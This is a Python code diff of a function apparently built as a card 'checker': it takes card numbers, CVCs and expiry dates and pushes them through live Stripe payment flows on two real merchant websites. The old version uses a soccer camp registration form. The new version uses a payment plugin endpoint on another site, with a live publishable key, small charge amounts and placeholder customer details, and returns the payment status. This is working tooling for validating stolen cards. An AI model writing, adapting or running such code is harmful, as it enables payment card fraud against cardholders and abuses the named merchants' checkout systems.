@@ -26,40 +26,67 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F2531af6ecf%3B+stripe-js-v3%2F2531af6ecf%3B+card-element&key=pk_live_51IhvFCI9vRapEwc0oXIdYrGiwfq9wTdgqsvJ8Y6rG6zr3WDU8r7MyCwhDjuANQZORPEdMovywEzImejpLijk3ATe00fIL9wUnU'
+	data = f'card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F2531af6ecf%3B+stripe-js-v3%2F2531af6ecf%3B+card-element&key=pk_live_Rmqi7BG0yPxwtW73DaoO7KR900ekbWbcrW'
 	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
 	
-	pm = response.json()['id']
+	tok = response.json()['id']
 	
 	headers = {
-	    'authority': 'chandellesoccer.com',
-	    'accept': '*/*',
+	    'Accept': 'application/json, text/javascript, */*; q=0.01',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'Origin': 'https://tra-professional.ie',
+	    'Referer': 'https://tra-professional.ie/payment/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	data = {
+	    'action': 'get_intent',
+	    'values': f'firstname=Rodam&lastname=User&address=Street%2027&email=rodamuser08%40gmail.com&invoice_nb=&amount=1&description=&cc_holder_name=&stripeToken={tok}',
+	}
+	
+	response = requests.post(
+	    'https://tra-professional.ie/wp-content/plugins/matrix-stripe-payment/frontend/ajax.php',
+	    headers=headers,
+	    data=data,
+	)
+	
+	pi = response.json()['id']
+	client_secret = response.json()['client_secret']
+	
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://chandellesoccer.com',
-	    'referer': 'https://chandellesoccer.com/chandelle-soccer-camp-registration/',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	    'sec-fetch-dest': 'empty',
 	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-site': 'same-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	params = {
-	    't': '1746794829577',
-	}
-	
-	data = f'data=__fluent_form_embded_post_id%3D10541%26_fluentform_10_fluentformnonce%3Da405b7b3cf%26_wp_http_referer%3D%252Fchandelle-soccer-camp-registration%252F%26Parent_name%3DCoach%26Email_Address%3Drodamuser08%2540gmail.com%26Phone_Number%3D4303000850%26Childs_Name%255B0%255D%255B%255D%3DRodam%2520User%26Childs_Name%255B0%255D%255B%255D%3D23%26Emergency_Contact_Name%3DRodam%2520User%26Phone_Number_1%3D4303000850%26Camp_selection%3DHalf%2520Day%2520Camp%26input_text%3DJune%25207%252C%25202025%2520(9%253A00%2520AM%2520%25E2%2580%2593%252012%253A00%2520PM)%26Location%3D1140%2520W%2520Alameda%2520Dr%2520Suite%25201%252C%2520Tempe%252C%2520AZ%252085282%26custom-payment-amount%3D0.50%26payment_method%3Dstripe%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=10'
+	data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[payment_user_agent]=stripe.js%2F2531af6ecf%3B+stripe-js-v3%2F2531af6ecf%3B+card-element&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_Rmqi7BG0yPxwtW73DaoO7KR900ekbWbcrW&client_secret={client_secret}'
 	
 	response = requests.post(
-	    'https://chandellesoccer.com/wp-admin/admin-ajax.php',
-	    params=params,
+	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
 	    headers=headers,
 	    data=data,
 	)
 	
-	return (response.text)
+	result = re.search(r'"status": "(.*?)"', response.text).group(1)
+	
+	return (result)
